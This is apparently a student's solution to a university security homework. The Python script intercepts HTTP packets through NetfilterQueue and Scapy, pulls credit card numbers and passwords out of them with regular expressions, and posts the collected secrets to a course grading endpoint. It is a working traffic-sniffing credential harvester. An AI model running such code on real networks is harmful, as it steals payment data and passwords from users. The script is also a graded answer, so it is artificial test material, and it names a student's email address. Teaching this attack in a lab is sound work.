from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP
import re
import requests
import json


return_list = []


def print_and_accept(pkt):
    regex = re.compile("/ex4/")
    card_regex = re.compile("(\d{4})((\/|\.)\d{4}){3}")
    password_regex = re.compile("(pwd --- )([A-Z0-9:;<=>?@]{8,30})(\s)")
    pkt.accept()

    ip = IP(pkt.get_payload())

    if ip["TCP"].dport == 80 and ip.haslayer("Raw"):
    	http = ip["Raw"].load.decode()

    	if regex.search(http):
    		#print(ip.show())
    		#print(http)

    		if card_regex.search(http):
    			cc = card_regex.search(http).group()
    			if cc not in return_list:
    				return_list.append(cc)

    		if password_regex.search(http):
    			password = password_regex.search(http).group().split()[2]
    			if password not in return_list:
    				return_list.append(password)

    if len(return_list) >= 5:
    	print(return_list)
    	data = {"student_email": "martin.vold@epfl.ch", "secrets": return_list}
    	r = requests.post("http://com402.epfl.ch/hw1/ex4/sensitive", json=data)
    	print(r.status_code)
    	print(r.text)


nfqueue = NetfilterQueue()
nfqueue.bind(0, print_and_accept, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()